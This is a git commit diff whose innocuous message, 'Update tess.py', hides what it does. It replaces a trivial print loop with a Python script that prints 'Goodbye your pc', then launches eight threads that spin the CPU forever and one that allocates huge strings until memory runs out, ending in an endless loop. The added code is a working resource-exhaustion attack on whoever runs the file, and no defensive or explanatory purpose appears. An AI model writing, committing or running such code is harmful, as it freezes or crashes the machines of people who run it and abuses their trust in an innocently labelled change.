f3afa607a8de032ee8a358c7106914399a1de300
lọ vương <helloeveryonevnlove@gmail.com>
2026-08-25 15:49:12 +0700

    Update tess.py

--- tess.py
+++ tess.py
@@ -1,4 +1,26 @@
-while true do
-A = ( "hello1" , "hello2" , "hello3" , "hello4" , "hello5" )
-print(A)
-end
+import threading
+print(
+    "Goodbye your pc"
+)
+print("......")
+input(
+    "Stand for freeze "
+    " end "
+)
+A = []
+def burn_cpu():
+  x = 0
+  while True:
+    x += 1
+def burn_ram():
+  while True:
+    try:
+      A.append("Goodbye" * 10**8)
+    except:
+      pass
+print("\nGoodbye_pc")
+for i in range(8):  
+  threading.Thread(target=burn_cpu, daemon=True).start()
+threading.Thread(target=burn_ram, daemon=True).start()
+while True:
+  pass
